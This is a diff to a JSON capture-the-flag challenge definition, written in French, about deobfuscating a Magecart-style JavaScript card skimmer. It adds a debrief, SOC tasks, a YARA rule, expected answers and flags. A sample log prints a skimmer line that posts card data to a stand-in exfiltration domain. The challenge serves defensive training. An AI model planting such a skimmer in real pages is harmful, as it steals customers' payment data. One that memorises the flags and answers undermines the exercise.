@@ -1,7 +1,7 @@
 {
   "id": "rev-01-js-packer",
   "title": "Obfuscated JavaScript Loader Deobfuscation",
-  "organization": "FinTech Web Application Defense",
+  "organization": "E-Commerce Online Gateway",
   "category": "Reverse Engineering",
   "target_os": "Linux",
   "machine_type": "challenge",
@@ -34,5 +34,44 @@
   ],
   "narrative_story": "Un script client de vérification de licence a été obfusqué avec un compresseur JS Packer et un tableau de chaînes chiffrées par décalage. Utilise les outils de développement Chrome, un déobfuscateur AST ou une exécution pas-à-pas dans un bac à sable Node.js sécurisé pour nettoyer le code et trouver le mot de passe secret de validation.",
   "target_port": 3333,
-  "virtual_ip": "10.10.22.39"
+  "virtual_ip": "10.10.22.39",
+  "debrief_json": {
+    "storyline": "Le skimmer de cartes bancaires injecté a été décodé et neutralisé. L'intégrité SRI et une CSP stricte protègent désormais la caisse.",
+    "technical_explanation": "Les attaques Magecart emploient des packers JS (eval base62) pour cacher aux outils d'analyse statique l'écoute des champs de formulaire de paiement.",
+    "key_lesson": "L'intégrité des sous-ressources (Subresource Integrity - SRI) empêche l'exécution de tout script tiers modifié.",
+    "historical_case": {
+      "title": "Attaque Magecart sur British Airways (2018)",
+      "description": "22 lignes de code JavaScript malveillant ont dérobé les données de paiement de 380 000 clients.",
+      "impact": "Amende record de 20 millions de livres sterling infligée par l'ICO au titre du RGPD."
+    },
+    "permanent_remediation": [
+      "Appliquer le hachage SHA-384 avec l'attribut integrity sur toutes les balises <script>.",
+      "Configurer CSP avec script-src 'self' et interdire 'unsafe-eval'."
+    ]
+  },
+  "defense_tasks": {
+    "soc_investigation": {
+      "description": "Dés-obfusque le script JavaScript malveillant injecté sur le portail de paiement pour isoler le domaine d'exfiltration.",
+      "sample_logs": "EVAL PACKER: eval(function(p,a,c,k,e,d)...)\nDEOBFUSCATED: document.forms[0].onsubmit = function() { fetch('https://mage-cart.stealer-node.net/drop', { method: 'POST', body: cc_data }); };\nC2 DOMAIN: mage-cart.stealer-node.net",
+      "question": "Quel domaine d'exfiltration de cartes bancaires (Magecart) est masqué dans le script obfusqué ?",
+      "expected_answer": "mage-cart.stealer-node.net"
+    },
+    "detection_rule": {
+      "type": "yara",
+      "description": "Règle YARA pour intercepter ce vecteur d'attaque.",
+      "starter_template": "rule Magecart_Obfuscated_JS_Skimmer {\n    meta:\n        description = \"Detects obfuscated JavaScript skimming scripts\"\n    strings:\n        $eval_packer = \"eval(function(p,a,c,k,e,d)\"\n        $domain = \"mage-cart.stealer-node.net\"\n    condition:\n        $eval_packer or $domain\n}",
+      "keywords_required": [
+        "rule",
+        "strings:",
+        "condition:",
+        "$eval_packer"
+      ],
+      "flag": "YARA{JAVASCRIPT_OBFUSCATED_SKIMMER_DETECTED_001}"
+    },
+    "remediation": {
+      "type": "harden_reverse_subresource_integrity",
+      "description": "Active l'intégrité des sous-ressources (SRI) et la politique CSP pour interdire les scripts inline et non signés.",
+      "flag": "REMEDIATION{CSP_STRICT_AND_SRI_ENFORCED_PAYMENTS}"
+    }
+  }
 }
